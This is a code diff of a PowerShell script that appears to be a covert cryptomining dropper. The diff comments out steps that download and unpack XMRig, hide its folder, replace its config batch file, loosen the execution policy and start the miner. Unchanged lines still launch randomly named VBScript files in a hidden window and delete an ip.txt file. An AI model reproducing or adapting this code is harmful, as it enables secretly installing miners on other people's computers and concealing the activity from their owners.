@@ -76,19 +76,19 @@ New-Item -ItemType Directory -Name "$wd" -Path "$path"
 cd $wd
 Set-Variable -Name currentDir -Value ($Pwd)
 
-Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
-Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
+# Invoke-WebRequest -OutFile "xmrig-6.22.2-msvc-win64.zip" -Uri "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
+# Expand-Archive -Path "$currentDir\xmrig-6.22.2-msvc-win64.zip" -DestinationPath "$initial_dir"
 
-Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
+# Set-ItemProperty -Value "Hidden" -Path "$initial_dir\xmrig-6.22.2" -Name Attributes
 
-Set-Variable -Name newConfigPath -Value ("$path\w.bat")
-Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
-if (Test-Path -Path $newConfigPath) {
-    Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
-    Write-Output "bat file has been replaced successfully."
-} else {
-    Write-Output "New bat file not found at the specified path."
-}
+# Set-Variable -Name newConfigPath -Value ("$path\w.bat")
+# Set-Variable -Value ("$initial_dir\xmrig-6.22.2\w.bat") -Name targetConfigPath
+# if (Test-Path -Path $newConfigPath) {
+#     Copy-Item -Path $newConfigPath -Destination $targetConfigPath -Force
+#     Write-Output "bat file has been replaced successfully."
+# } else {
+#     Write-Output "New bat file not found at the specified path."
+# }
 
 Remove-Item -Path "$initial_dir\ip.txt"
 
@@ -113,9 +113,9 @@ cd $initial_dir
 
 Start-Process -FilePath "cscript.exe" -windowstyle hidden -ArgumentList "ZDaFvwjOosKx.vbs"
 
-Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
-cd "$initial_dir\xmrig-6.22.2"
-Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
+# Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
+# cd "$initial_dir\xmrig-6.22.2"
+# Start-Process -FilePath ".\w.bat" -NoNewWindow -Wait
 
 & "./TMqhONoBljEv.vbs"
 
